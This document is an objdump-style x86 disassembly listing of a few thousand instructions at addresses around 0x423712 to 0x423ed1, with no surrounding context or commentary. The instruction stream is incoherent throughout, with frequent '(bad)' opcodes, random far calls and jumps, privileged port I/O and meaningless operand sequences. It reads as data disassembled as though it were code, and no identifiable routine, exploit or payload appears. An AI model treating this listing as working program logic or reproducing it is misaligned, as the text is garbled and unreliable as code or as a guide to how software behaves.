  423712:	not    DWORD PTR [ebp+0x1d9254b8]
  423718:	shl    DWORD PTR [edi-0x261e8f6],1
  42371e:	daa    
  42371f:	sub    al,0x61
  423721:	add    al,0xde
  423723:	xor    BYTE PTR [esi],dl
  423725:	stc    
  423726:	sahf   
  423727:	sbb    ah,bl
  423729:	mov    gs,WORD PTR [ebx]
  42372b:	sub    al,BYTE PTR [eax+eax*1]
  42372e:	add    DWORD PTR [ebp+0x2d6cd9be],0xffffffe2
  423735:	jmp    DWORD PTR [esi-0x63a822c1]
  42373b:	popa   
  42373c:	sbb    DWORD PTR [eax+0x7a],edi
  42373f:	(bad)
  423742:	adc    DWORD PTR [ebp-0x2eaff8d4],ebp
  423748:	push   es
  423749:	cdq    
  42374a:	js     0x4236e4
  42374c:	neg    BYTE PTR [ecx+0x48]
  42374f:	lods   al,BYTE PTR ds:[esi]
  423750:	mov    dh,0xb0
  423752:	sub    ebx,ebx
  423754:	arpl   WORD PTR [esi-0x3a039828],si
  42375a:	icebp  
  42375b:	cld    
  42375c:	adc    BYTE PTR [eax+eax*8+0x4],ch
  423760:	xlat   BYTE PTR ds:[ebx]
  423761:	or     esi,esp
  423763:	aas    
  423764:	ja     0x4237a8
  423766:	cdq    
  423767:	shr    DWORD PTR [ecx+esi*8+0x7ec5170e],cl
  42376e:	xchg   edi,eax
  42376f:	add    al,cl
  423771:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423773:	jp     0x4237ca
  423775:	xor    ebx,DWORD PTR [edx-0xb42001c]
  42377b:	xlat   BYTE PTR ds:[ebx]
  42377c:	imul   edx,DWORD PTR [ebx],0x39
  42377f:	push   ebp
  423780:	call   0x80d9:0x9ffe603
  423787:	add    bl,bh
  423789:	mov    WORD PTR [ebx+ebx*4+0x11],?
  42378d:	pop    esi
  42378e:	es jno 0x423750
  423791:	sbb    edx,DWORD PTR [edi]
  423793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423794:	dec    ebp
  423795:	jp     0x42378c
  423797:	or     ah,cl
  423799:	push   eax
  42379a:	mov    al,0x35
  42379c:	scas   eax,DWORD PTR es:[edi]
  42379d:	or     esp,DWORD PTR [ecx+0x370bafab]
  4237a3:	lods   eax,DWORD PTR ds:[esi]
  4237a4:	mov    al,0xcd
  4237a6:	dec    ebp
  4237a7:	pop    eax
  4237a8:	push   ds
  4237a9:	xor    BYTE PTR [ebp+ebx*4-0x7a],dl
  4237ad:	pop    ds
  4237ae:	sub    DWORD PTR [esi-0x6],edx
  4237b1:	shl    ebp,1
  4237b3:	pop    ds
  4237b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237b5:	cmp    ebp,DWORD PTR [edi]
  4237b7:	mov    esi,esp
  4237b9:	fiadd  DWORD PTR [edx]
  4237bb:	das    
  4237bc:	xchg   ebp,eax
  4237bd:	out    dx,al
  4237be:	pop    edx
  4237bf:	mov    ch,0xda
  4237c1:	mov    esp,0x14c6b5c8
  4237c6:	push   eax
  4237c7:	cmp    dl,BYTE PTR [ecx+0x25]
  4237ca:	xor    dh,BYTE PTR [edx]
  4237cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237cd:	out    dx,eax
  4237ce:	pop    ebp
  4237cf:	lea    ebx,[ebp-0x1e]
  4237d2:	sbb    BYTE PTR [ecx],al
  4237d4:	dec    edx
  4237d5:	ds es mov ah,0x70
  4237d9:	dec    ebx
  4237da:	fimul  WORD PTR [ecx]
  4237dc:	outs   dx,BYTE PTR ds:[esi]
  4237dd:	lods   eax,DWORD PTR ds:[esi]
  4237de:	pop    esp
  4237df:	add    BYTE PTR [ebx+eax*8-0x570bbce8],bl
  4237e6:	or     al,0x5e
  4237e8:	push   esi
  4237e9:	or     al,0xbd
  4237eb:	mov    ecx,0x299f6b3f
  4237f0:	adc    edx,DWORD PTR [esi+0x2da00bba]
  4237f6:	mov    cl,0xb9
  4237f8:	pop    ebp
  4237f9:	add    eax,0xca19acff
  4237fe:	and    bh,BYTE PTR [ebx+eax*1]
  423801:	mov    eax,ecx
  423803:	jne    0x423815
  423805:	mov    cl,BYTE PTR [eax+0x38]
  423808:	inc    esp
  423809:	jo     0x423881
  42380b:	in     al,0x79
  42380d:	mov    ecx,0x842d9644
  423812:	jp     0x4237ed
  423814:	test   eax,0x50b0b7bd
  423819:	(bad)  
  42381a:	js     0x423808
  42381c:	push   ebp
  42381d:	inc    ebx
  42381e:	dec    ebx
  42381f:	xor    eax,DWORD PTR [ecx-0x54fdac5a]
  423825:	frstor [ecx+0x6e68c1d1]
  42382b:	add    eax,0xbfd3778c
  423830:	std    
  423831:	out    dx,eax
  423832:	sbb    eax,0x257e5a34
  423837:	dec    BYTE PTR [esi+0x14a77bd2]
  42383d:	inc    edi
  42383e:	push   ds
  42383f:	push   ebp
  423840:	xor    eax,0xef42f2e3
  423845:	lds    edi,FWORD PTR [eax-0x209f1a79]
  42384b:	jl     0x423818
  42384d:	std    
  42384e:	xor    dh,BYTE PTR [edi+0x479d5b97]
  423854:	push   ebx
  423855:	or     bl,0x61
  423858:	jmp    0x8ac3d6bd
  42385d:	cdq    
  42385e:	int    0x5b
  423860:	mov    dl,0x7d
  423862:	ss dec ebx
  423864:	shl    BYTE PTR ds:0x141db773,0xf1
  42386b:	mov    ds:0xbba64c49,al
  423870:	add    ch,BYTE PTR [eax]
  423872:	inc    ebx
  423873:	out    0xc4,al
  423875:	fdiv   DWORD PTR [ecx+eax*8]
  423878:	mov    ch,BYTE PTR [ebp+0x512b838f]
  42387e:	add    cl,ah
  423880:	les    esi,FWORD PTR [edx+edx*1+0x72dbc1c]
  423887:	xchg   ebp,eax
  423888:	xchg   ecx,eax
  423889:	(bad)  
  42388b:	imul   eax,ecx,0x91ad4dec
  423891:	inc    ebp
  423892:	sub    bh,cl
  423894:	mov    esi,es
  423896:	sar    DWORD PTR [edx],0x28
  423899:	es jle 0x4238d6
  42389c:	daa    
  42389d:	fs and eax,0xffffffbb
  4238a1:	enter  0x80bc,0xee
  4238a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238a6:	push   ecx
  4238a7:	xchg   esi,eax
  4238a8:	sbb    edi,DWORD PTR [ecx+edx*4+0x391aee47]
  4238af:	xchg   ebx,eax
  4238b0:	or     ebp,ebp
  4238b2:	pop    es
  4238b3:	sub    al,BYTE PTR [edx+0x5b]
  4238b6:	jbe    0x423921
  4238b8:	mov    ebx,edi
  4238ba:	and    dh,dh
  4238bc:	(bad)  
  4238bd:	pop    ecx
  4238be:	adc    al,0xb5
  4238c0:	cmp    DWORD PTR [eax+eiz*2+0x372887c1],ecx
  4238c7:	dec    edi
  4238c8:	pop    esi
  4238c9:	out    0x1,al
  4238cb:	push   cs
  4238cc:	lods   al,BYTE PTR ds:[esi]
  4238cd:	jbe    0x423888
  4238cf:	xor    DWORD PTR [edx-0x58117625],ebx
  4238d5:	sbb    ebp,DWORD PTR ds:0xf082ebfa
  4238db:	mov    fs:0xf311fbfb,eax
  4238e1:	scas   al,BYTE PTR es:[edi]
  4238e2:	jle    0x4238b0
  4238e4:	xor    eax,0x4a7c21fe
  4238e9:	mov    ?,WORD PTR [ebx+edx*8+0x6c]
  4238ed:	loop   0x4238a8
	...
  4238f7:	add    BYTE PTR [eax],al
  4238f9:	add    ch,bl
  4238fb:	cmp    al,0x8f
  4238fd:	mov    esp,0x7dffbfef
  423902:	in     al,dx
  423903:	outs   dx,BYTE PTR ds:[esi]
  423904:	fs push esp
  423906:	xor    eax,0xc0bd0683
  42390b:	mov    dl,0x1
  42390d:	add    ch,bh
  42390f:	add    DWORD PTR [eax],eax
  423911:	add    BYTE PTR [edx+0x64],cl
  423914:	repz or al,BYTE PTR ds:0x80b035ac
  42391b:	jecxz  0x4238f5
  42391d:	gs push ecx
  42391f:	mov    BYTE PTR [ecx+0x5],dh
  423922:	inc    edx
  423923:	xchg   ebp,eax
  423924:	jmp    eax
  423926:	and    edi,edx
  423928:	inc    ecx
  423929:	stc    
  42392a:	int3   
  42392b:	cmp    al,BYTE PTR [esi-0x11]
  42392e:	push   cs
  42392f:	sbb    DWORD PTR [esi],ebp
  423931:	mov    esp,0xbd228108
  423936:	outs   dx,DWORD PTR ds:[esi]
  423937:	neg    BYTE PTR [esi]
  423939:	leave  
  42393a:	cmp    dl,al
  42393c:	aad    0x59
  42393e:	in     al,dx
  42393f:	loop   0x4238cd
  423941:	and    eax,0xebdff50d
  423946:	pop    ebx
  423947:	idiv   BYTE PTR [edx-0x78]
  42394a:	out    dx,eax
  42394b:	addr16 push ds
  42394d:	push   edi
  42394e:	retf   0xebe5
  423951:	add    edi,ebp
  423953:	nop
  423954:	and    ch,bh
  423956:	test   BYTE PTR [ebp+0x0],ah
  423959:	das    
  42395a:	(bad)  
  42395b:	leave  
  42395c:	int    0x12
  42395e:	mov    al,0x26
  423960:	mov    esp,0x5c063250
  423965:	add    cl,bl
  423967:	inc    esp
  423968:	js     0x42396f
  42396a:	cmp    bh,BYTE PTR [ebx-0x1d676f60]
  423970:	test   al,0xaf
  423972:	cmp    al,0xe2
  423974:	xchg   ah,al
  423976:	sub    al,0x11
  423978:	mov    esp,0xdb793d98
  42397d:	push   esi
  42397e:	push   eax
  42397f:	rcl    BYTE PTR [edi-0x49],cl
  423982:	mov    al,ds:0x4d99b2e3
  423987:	pop    ds
  423988:	push   ebp
  423989:	clc    
  42398a:	jl     0x4239aa
  42398c:	jl     0x42395e
  42398e:	pop    eax
  42398f:	push   ss
  423990:	inc    esi
  423991:	push   esp
  423992:	add    eax,0xb7ceefc9
  423997:	inc    edi
  423998:	xchg   ebx,eax
  423999:	jns    0x423940
  42399b:	push   ebp
  42399c:	mov    ebp,0x49b411c2
  4239a1:	sbb    ch,dh
  4239a3:	test   BYTE PTR [ebx+edi*4],bh
  4239a6:	outs   dx,BYTE PTR ds:[esi]
  4239a7:	sbb    bl,BYTE PTR [edi+0x440245e4]
  4239ad:	jg     0x4239b4
  4239af:	gs jp  0x42397f
  4239b2:	inc    eax
  4239b3:	iret   
  4239b4:	xor    DWORD PTR [edi],eax
  4239b6:	in     eax,0xbb
  4239b8:	inc    edx
  4239b9:	adc    DWORD PTR [ebp-0x1b],edx
  4239bc:	mov    cl,0xe4
  4239be:	dec    edx
  4239bf:	mov    esi,0x136cc077
  4239c4:	daa    
  4239c5:	adc    BYTE PTR [ebx],cl
  4239c7:	mov    fs,WORD PTR [eax+0x26]
  4239ca:	xor    DWORD PTR [edx-0x40],0x1
  4239ce:	mov    cl,0xf0
  4239d0:	shr    DWORD PTR [ebp-0x5a],0xb8
  4239d4:	mul    BYTE PTR [edx]
  4239d6:	jl     0x42395c
  4239d8:	setl   ch
  4239db:	mov    dh,0x1c
  4239dd:	mov    esp,0x1c78a43c
  4239e2:	ja     0x423a03
  4239e4:	jle    0x4239c9
  4239e6:	in     eax,0x4e
  4239e8:	(bad)  
  4239e9:	enter  0x78d0,0xce
  4239ed:	push   eax
  4239ee:	jbe    0x423a28
  4239f0:	fs int3 
  4239f2:	pop    eax
  4239f3:	cld    
  4239f4:	or     DWORD PTR [eax-0x13],0xffffffff
  4239f8:	lock stos BYTE PTR es:[edi],al
  4239fa:	(bad)  
  4239fb:	leave  
  4239fc:	mov    esi,0x41383bd1
  423a01:	into   
  423a02:	and    edi,DWORD PTR [edx-0x78]
  423a05:	mov    DWORD PTR [edx+0x507b913d],0xafee0862
  423a0f:	les    edi,FWORD PTR [ebx-0x1]
  423a12:	mov    DWORD PTR [ebp+0x1b705faf],edi
  423a18:	fisttp QWORD PTR [eax]
  423a1a:	daa    
  423a1b:	scas   al,BYTE PTR es:[edi]
  423a1c:	inc    edi
  423a1d:	imul   ecx,DWORD PTR [ebx-0x25a9d2a1],0xd
  423a24:	call   0xc1a8:0x7984afcf
  423a2b:	add    ebx,DWORD PTR [esi+0x3a]
  423a2e:	pusha  
  423a2f:	xor    al,0x5a
  423a31:	jb     0x4239b9
  423a33:	push   ds
  423a34:	jmp    0x423a44
  423a36:	pop    ebx
  423a37:	or     al,0x14
  423a39:	cwde   
  423a3a:	xor    eax,DWORD PTR [eax+0x13fe68d3]
  423a40:	xchg   ecx,eax
  423a41:	jno    0x423a3f
  423a43:	fidivr WORD PTR ds:[ecx-0x2a]
  423a47:	repz adc eax,0xcdacb599
  423a4d:	mov    ds:0xcf51d7bd,eax
  423a52:	mov    dh,0xb
  423a54:	or     al,0xc4
  423a56:	iret   
  423a57:	cmp    eax,0xb2cf8f9f
  423a5c:	xchg   esp,eax
  423a5d:	push   ds
  423a5e:	neg    edx
  423a60:	mov    edi,0xf6239d41
  423a65:	jne    0x423ab0
  423a67:	adc    bl,0xcd
  423a6a:	jecxz  0x423ad5
  423a6c:	jmp    DWORD PTR [edi+0x35]
  423a6f:	xchg   edi,eax
  423a70:	ficom  DWORD PTR [edi]
  423a72:	xor    esi,DWORD PTR [edx-0x77]
  423a75:	leave  
  423a76:	in     eax,0x94
  423a78:	xchg   edi,eax
  423a79:	mov    WORD PTR [edx+0x235815fb],cs
  423a7f:	ins    DWORD PTR es:[edi],dx
  423a80:	add    ebp,DWORD PTR [eax+0x58ebd038]
  423a86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a87:	(bad)  
  423a8a:	add    eax,0x4efd7a2e
  423a8f:	inc    esi
  423a90:	je     0x423a6c
  423a92:	nop
  423a93:	xchg   esi,eax
  423a94:	out    0x67,al
  423a96:	push   es
  423a97:	arpl   WORD PTR [eax-0x2b17688c],si
  423a9d:	xchg   edx,eax
  423a9e:	out    0x56,eax
  423aa0:	and    DWORD PTR [eax+edi*2+0x29],edx
  423aa4:	xor    al,0x26
  423aa6:	add    esi,esp
  423aa8:	xchg   DWORD PTR [edi-0x570363a2],esi
  423aae:	mov    dh,0x95
  423ab0:	ss (bad) 
  423ab2:	jg     0x423abb
  423ab4:	sub    esi,DWORD PTR [ebp+0x7d]
  423ab7:	sar    DWORD PTR [eax+0xb],cl
  423aba:	lods   al,BYTE PTR ds:[esi]
  423abb:	test   bh,ah
  423abd:	inc    esp
  423abe:	jmp    0x45fc:0x5ebee421
  423ac5:	pop    ecx
  423ac6:	jmp    0xaada4bdc
  423acb:	or     DWORD PTR [ecx+0x42],eax
  423ace:	xchg   ebp,eax
  423acf:	cwde   
  423ad0:	hlt    
  423ad1:	in     eax,dx
  423ad2:	pop    ds
  423ad3:	addr16 je 0x423a5a
  423ad6:	sub    al,0x8f
  423ad8:	inc    esi
  423ad9:	loope  0x423a7d
  423adb:	shl    DWORD PTR [edi+0x78],0x99
  423adf:	fmul   st,st(7)
  423ae1:	jg     0x423a85
  423ae3:	pop    esp
  423ae4:	lods   eax,DWORD PTR ds:[esi]
  423ae5:	je     0x423a84
  423ae7:	cmc    
  423ae8:	nop
  423ae9:	jbe    0x423b0d
  423aeb:	daa    
  423aec:	add    ch,BYTE PTR [edi]
  423aee:	fsubr  st(1),st
  423af0:	or     al,0x5a
  423af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423af3:	out    dx,eax
  423af4:	(bad)  [ebp+0x6a]
  423af7:	and    eax,0xa816798d
  423afc:	out    0x17,eax
  423afe:	imul   edi,DWORD PTR [edi+0x263fd2f5],0x8
  423b05:	mov    ebp,0x63a257a7
  423b0a:	add    ah,ch
  423b0c:	enter  0xd9d5,0x0
	...
  423b18:	add    BYTE PTR [eax],al
  423b1a:	mov    dh,0xdf
  423b1c:	fwait
  423b1d:	add    bh,bl
  423b1f:	inc    esi
  423b20:	mov    edi,0x261aff
  423b25:	jb     0x423b4a
  423b27:	sub    al,ch
  423b29:	mov    bh,BYTE PTR [ebp-0x2fffe4c]
  423b2f:	add    DWORD PTR [eax],eax
  423b31:	add    al,cl
  423b33:	mov    edi,0xffb9671c
  423b38:	push   ebx
  423b39:	int    0x28
  423b3b:	out    dx,eax
  423b3c:	add    BYTE PTR [eax],cl
  423b3e:	sbb    eax,0x7f3e5f7f
  423b43:	iret   
  423b44:	loope  0x423b22
  423b46:	sub    eax,0x5210fd62
  423b4b:	je     0x423b33
  423b4d:	mov    cl,0x3c
  423b4f:	(bad)  
  423b50:	pop    ds
  423b51:	xchg   edx,eax
  423b52:	inc    edi
  423b53:	gs out dx,al
  423b55:	test   al,0xdd
  423b57:	retf   
  423b58:	cmp    ebp,DWORD PTR [eax]
  423b5a:	mov    ah,0x1f
  423b5c:	(bad)  
  423b5d:	cld    
  423b5e:	and    dl,cl
  423b60:	mov    eax,ds:0x19181377
  423b65:	jmp    0x8478:0x127f78bb
  423b6c:	and    DWORD PTR [edx+0x8],0x1e
  423b70:	test   DWORD PTR [ebx-0x20],ebp
  423b73:	into   
  423b74:	push   eax
  423b75:	cmovbe ebx,DWORD PTR [ebp+0x5a]
  423b79:	mov    al,ds:0xf4debbc1
  423b7e:	and    al,0x5b
  423b80:	(bad)  
  423b81:	int    0xc7
  423b83:	xchg   esp,eax
  423b84:	cld    
  423b85:	retf   0xf574
  423b88:	cmc    
  423b89:	ss push esp
  423b8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b8c:	mov    WORD PTR ds:[di+0x12],ds
  423b91:	cwde   
  423b92:	inc    edi
  423b93:	lods   al,BYTE PTR ds:[esi]
  423b94:	pop    ss
  423b95:	push   edx
  423b96:	cmp    DWORD PTR [ebp-0x64],0x53
  423b9a:	pop    edx
  423b9b:	les    esi,FWORD PTR [esi+ebx*4+0x5b526ac1]
  423ba2:	test   al,0x21
  423ba4:	mov    bl,0xa7
  423ba6:	mov    ds:0x54fe33d5,al
  423bab:	sub    eax,0xcabd46be
  423bb0:	mov    eax,0xcd82f956
  423bb5:	repz scas al,BYTE PTR es:[edi]
  423bb7:	mov    ebx,0x717698d1
  423bbc:	dec    edx
  423bbd:	mov    dh,dh
  423bbf:	stos   DWORD PTR es:[edi],eax
  423bc0:	jae    0x423b74
  423bc2:	call   0x168227f5
  423bc7:	fwait
  423bc8:	retf   0xa03d
  423bcb:	jb     0x423b69
  423bcd:	cmp    al,0xaa
  423bcf:	popa   
  423bd0:	int3   
  423bd1:	xor    BYTE PTR [eax-0x50dec27b],0x9
  423bd8:	iret   
  423bd9:	call   0x3e80:0x4737904f
  423be0:	(bad)  
  423be2:	jmp    0xcf9cda99
  423be7:	add    ebx,esp
  423be9:	iret   
  423bea:	cmp    al,0xcd
  423bec:	cmp    ah,bh
  423bee:	sbb    eax,DWORD PTR [ebp+ebx*1+0x28554fbf]
  423bf5:	imul   edx,DWORD PTR ds:0xe063dabf,0x51
  423bfc:	jle    0x423c2a
  423bfe:	jl     0x423c6c
  423c00:	cmp    bp,WORD PTR [ebp+0x69]
  423c04:	cmp    bl,bl
  423c06:	popa   
  423c07:	jo     0x423c35
  423c09:	ins    BYTE PTR es:[edi],dx
  423c0a:	shl    DWORD PTR [edi+ebp*8+0x6e],1
  423c0e:	(bad)  
  423c0f:	sti    
  423c10:	mov    ds:0x26d9474,eax
  423c15:	push   cs
  423c16:	test   eax,0x83f67b66
  423c1b:	and    al,0x76
  423c1d:	mov    ds:0x41e2914b,al
  423c22:	test   BYTE PTR [ecx-0x37453c54],bh
  423c28:	inc    edx
  423c29:	loop   0x423bcd
  423c2b:	js     0x423bd3
  423c2d:	mov    dh,ch
  423c2f:	(bad)  
  423c30:	and    DWORD PTR [ebx],edi
  423c32:	clc    
  423c33:	outs   dx,BYTE PTR ds:[esi]
  423c34:	and    ah,dh
  423c36:	scas   al,BYTE PTR es:[edi]
  423c37:	popa   
  423c38:	dec    esi
  423c39:	in     eax,0xd7
  423c3b:	xchg   ebp,eax
  423c3c:	js     0x423be4
  423c3e:	cdq    
  423c3f:	xchg   DWORD PTR [esi-0x40c8768e],eax
  423c45:	inc    eax
  423c46:	xchg   DWORD PTR [ebx+edx*8+0x1a2755e9],eax
  423c4d:	retf   
  423c4e:	adc    BYTE PTR [edx+0x75f4f2c7],0xc
  423c55:	ja     0x423bf8
  423c57:	aad    0x6b
  423c59:	ins    BYTE PTR es:[edi],dx
  423c5a:	out    dx,al
  423c5b:	cmp    eax,0xa18395d1
  423c60:	cs ins BYTE PTR es:[edi],dx
  423c62:	out    0x40,eax
  423c64:	pop    ecx
  423c65:	dec    esi
  423c66:	in     al,0x77
  423c68:	fst    QWORD PTR [ebx+0x5db60c52]
  423c6e:	xchg   esp,eax
  423c6f:	mov    ebx,DWORD PTR [esi]
  423c71:	call   0xa19b:0x8328215d
  423c78:	add    al,0x23
  423c7a:	ror    DWORD PTR [ecx+0x6bf4b8a8],0xd1
  423c81:	xor    DWORD PTR [ebx-0xa],esi
  423c84:	repz imul edi,DWORD PTR [ebx+ecx*4],0x575e4572
  423c8c:	jp     0x423cc6
  423c8e:	dec    ebx
  423c8f:	inc    ebp
  423c90:	enter  0xaedb,0xf8
  423c94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c95:	out    0xcf,al
  423c97:	rcl    DWORD PTR [ebp-0x40],0x64
  423c9b:	jle    0x423d11
  423c9d:	js     0x423c57
  423c9f:	push   ebp
  423ca0:	popf   
  423ca1:	outs   dx,BYTE PTR ds:[esi]
  423ca2:	lds    ebp,FWORD PTR [ebx]
  423ca4:	adc    eax,0x81bf0d32
  423ca9:	iret   
  423caa:	add    DWORD PTR [ebx+esi*4],0x6cf55c0b
  423cb1:	jno    0x423c9d
  423cb3:	xchg   edx,eax
  423cb4:	ficom  WORD PTR [edx]
  423cb6:	or     ebp,edi
  423cb8:	adc    edx,edx
  423cba:	push   ebp
  423cbb:	dec    eax
  423cbc:	leave  
  423cbd:	fsubrp st(5),st
  423cbf:	imul   esp,esp,0x7d74d128
  423cc5:	scas   al,BYTE PTR es:[edi]
  423cc6:	(bad)  
  423cc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cc8:	fsub   st(0),st
  423cca:	and    BYTE PTR [edi+0x7],ch
  423ccd:	pop    esp
  423cce:	pop    esi
  423ccf:	lahf   
  423cd0:	mov    ebx,0xee6048f6
  423cd5:	push   cs
  423cd6:	push   esi
  423cd7:	popa   
  423cd8:	iret   
  423cd9:	fwait
  423cda:	(bad)  
  423cdb:	ja     0x423cc0
  423cdd:	sub    DWORD PTR [ebx+0xfc2e87f],esp
  423ce3:	add    al,0x5c
  423ce5:	mov    edi,0xd2bce6f5
  423cea:	sbb    eax,0x68623a23
  423cef:	mov    WORD PTR [esi+0x4058d42],cs
  423cf5:	pop    ebx
  423cf6:	aad    0xfd
  423cf8:	jmp    0x423c7a
  423cfa:	and    eax,0x46a09c44
  423cff:	push   edi
  423d00:	loop   0x423d2f
  423d02:	add    edi,DWORD PTR [esi-0x78e3608b]
  423d08:	lock sub al,0xa0
  423d0b:	xor    ch,BYTE PTR [esi+eax*2-0x8]
  423d0f:	std    
  423d10:	outs   dx,BYTE PTR ds:[esi]
  423d11:	jge    0x423d04
  423d13:	fs dec ecx
  423d15:	jmp    0x423d8f
  423d17:	pop    edi
  423d18:	xchg   ecx,eax
  423d19:	jns    0x423d37
  423d1b:	mov    fs,WORD PTR [ecx-0x7c]
  423d1e:	inc    eax
  423d1f:	sahf   
  423d20:	dec    ecx
  423d21:	jo     0x423d66
  423d23:	fwait
  423d24:	xchg   esi,eax
  423d25:	mov    eax,ds:0xe218ef62
  423d2a:	inc    esp
  423d2b:	pop    eax
  423d2c:	les    ebp,FWORD PTR [edi*8+0x0]
  423d33:	add    BYTE PTR [eax],al
  423d35:	add    BYTE PTR [eax],al
  423d37:	add    BYTE PTR [eax],al
  423d39:	add    al,bh
  423d3b:	mov    ah,0x7f
  423d3d:	cmp    eax,0xf5faff7f
  423d42:	mov    edx,0x4e57ffb2
  423d47:	mov    eax,0xb6ba9020
  423d4c:	add    DWORD PTR [eax],eax
  423d4e:	std    
  423d4f:	add    DWORD PTR [eax],eax
  423d51:	add    ch,ch
  423d53:	in     eax,0x9e
  423d55:	adc    BYTE PTR [esi],bl
  423d57:	dec    DWORD PTR [ecx+0x38ae5959]
  423d5d:	(bad)  
  423d5e:	loop   0x423d41
  423d60:	and    al,0xc8
  423d62:	mov    edx,0x3c825e7d
  423d67:	and    ecx,esp
  423d69:	into   
  423d6a:	pop    esp
  423d6b:	adc    BYTE PTR ds:0x59e4386e,ah
  423d71:	xor    bh,BYTE PTR [edi+esi*1+0x105dbbf9]
  423d78:	daa    
  423d79:	jb     0x423dec
  423d7b:	inc    ecx
  423d7c:	xchg   ecx,eax
  423d7d:	xchg   esi,eax
  423d7e:	and    cl,BYTE PTR [edx]
  423d80:	cdq    
  423d81:	fistp  DWORD PTR fs:[edi]
  423d84:	sub    al,BYTE PTR [ebx+0x1b99520a]
  423d8a:	iret   
  423d8b:	retf   
  423d8c:	loope  0x423d98
  423d8e:	retf   
  423d8f:	out    dx,al
  423d90:	sub    eax,0xaa2cdf9d
  423d95:	int    0x6d
  423d97:	or     al,BYTE PTR gs:[ecx]
  423d9a:	mov    esp,0xae9d2830
  423d9f:	cli    
  423da0:	sti    
  423da1:	je     0x423d5d
  423da3:	sbb    al,0x7e
  423da5:	mov    ch,BYTE PTR [esi+edx*1]
  423da8:	outs   dx,BYTE PTR ds:[esi]
  423da9:	push   cs
  423daa:	div    edi
  423dac:	daa    
  423dad:	sbb    DWORD PTR [ebp+0x71404508],edi
  423db3:	or     DWORD PTR [ecx-0x20556873],ecx
  423db9:	jmp    0xb7e8aee2
  423dbe:	mov    bh,bl
  423dc0:	aad    0xef
  423dc2:	or     dl,BYTE PTR [ebp+edi*8-0x49]
  423dc6:	(bad)  
  423dc7:	sbb    ch,BYTE PTR [ecx+esi*1-0x76]
  423dcb:	rcl    BYTE PTR [ecx-0x4899c592],1
  423dd1:	(bad)  
  423dd2:	sub    BYTE PTR [ebp-0x1],al
  423dd5:	(bad)  
  423dd6:	push   ecx
  423dd7:	xchg   esp,eax
  423dd8:	inc    ecx
  423dd9:	les    eax,FWORD PTR [edx]
  423ddb:	out    0xda,eax
  423ddd:	pop    ecx
  423dde:	mov    ebp,0xce6e2c72
  423de3:	mov    ecx,0xa4f14fc2
  423de8:	cmp    eax,0xbe233c4f
  423ded:	pop    es
  423dee:	test   BYTE PTR [edx-0x1aed9af1],0xba
  423df5:	out    dx,al
  423df6:	push   0xe7a98306
  423dfb:	and    al,0xf4
  423dfd:	cwde   
  423dfe:	push   eax
  423dff:	cwde   
  423e00:	push   es
  423e01:	pop    ds
  423e02:	leave  
  423e03:	pop    es
  423e04:	ins    DWORD PTR es:[edi],dx
  423e05:	lock push ebx
  423e07:	mov    WORD PTR [esi],es
  423e09:	ss mov edx,0x635007d3
  423e0f:	mov    ecx,0xc5a05b32
  423e14:	bound  eax,QWORD PTR [eax+0x16]
  423e17:	fwait
  423e18:	adc    ecx,DWORD PTR [edi+0x75]
  423e1b:	retf   0x6a8a
  423e1e:	(bad)  
  423e1f:	or     edi,DWORD PTR [edi]
  423e21:	mov    ebp,0xedcf5740
  423e26:	cmp    eax,0xb38a93b3
  423e2b:	jle    0x423e6d
  423e2d:	xor    al,0x55
  423e2f:	add    edi,DWORD PTR [edi-0x2a]
  423e32:	das    
  423e33:	sbb    DWORD PTR [ebx],0x7418956e
  423e39:	cmp    BYTE PTR [ebp-0x6ebb653c],0x59
  423e40:	das    
  423e41:	and    BYTE PTR [ebx+0x84dfe2b],bh
  423e47:	shl    BYTE PTR [ebx+edi*8-0x5cccc3f9],cl
  423e4e:	cmc    
  423e4f:	xor    BYTE PTR [edx+0x3],bl
  423e52:	jmp    0x423eb8
  423e54:	inc    ebp
  423e55:	xchg   ecx,eax
  423e56:	pushf  
  423e57:	and    al,0xc0
  423e59:	fstp   TBYTE PTR [esi+0x79d85da]
  423e5f:	xchg   ebp,eax
  423e60:	sub    bh,bl
  423e62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e63:	and    eax,ecx
  423e65:	pop    ss
  423e66:	sbb    al,0x16
  423e68:	push   es
  423e69:	int3   
  423e6a:	dec    esi
  423e6b:	add    ebx,DWORD PTR [esi]
  423e6d:	mov    ds:0xf23933a4,eax
  423e72:	outs   dx,BYTE PTR ds:[esi]
  423e73:	xchg   BYTE PTR [ecx+ecx*2-0x7c],dh
  423e77:	cwde   
  423e78:	mov    ah,BYTE PTR [ebx-0x1c]
  423e7b:	push   edx
  423e7c:	sub    DWORD PTR [ebx],ebx
  423e7e:	rcl    ch,0x0
  423e81:	jb     0x423e7e
  423e83:	test   BYTE PTR [ebx],cl
  423e85:	or     al,0xd
  423e87:	stos   DWORD PTR es:[edi],eax
  423e88:	enter  0xfa2f,0xd7
  423e8c:	(bad)  
  423e8d:	jb     0x423e6b
  423e8f:	sub    edi,edi
  423e91:	sahf   
  423e92:	(bad)  
  423e93:	sub    BYTE PTR [esi+0x44],bl
  423e96:	xchg   ebx,eax
  423e97:	in     eax,dx
  423e98:	dec    ecx
  423e99:	push   esp
  423e9a:	es adc esp,ebp
  423e9d:	inc    ecx
  423e9e:	stos   DWORD PTR es:[edi],eax
  423e9f:	aad    0x7a
  423ea1:	or     DWORD PTR [edi+0x51],edi
  423ea4:	mov    edx,DWORD PTR gs:[edx-0x7c]
  423ea8:	add    dh,BYTE PTR [ebp-0x24]
  423eab:	ss mov esi,0x235a80a5
  423eb1:	sbb    eax,0x68747a93
  423eb6:	push   ds
  423eb7:	or     DWORD PTR [esi-0x4d65b3ce],ebx
  423ebd:	arpl   WORD PTR [ebp-0x2],bx
  423ec0:	mov    dh,0xb4
  423ec2:	push   cs
  423ec3:	mov    ebx,0x4f39190b
  423ec8:	clc    
  423ec9:	sbb    BYTE PTR [ebp+ecx*4-0x73],cl
  423ecd:	hlt    
  423ece:	fs mov bh,0x48
  423ed1:	adc    esp,0x9812c3c0
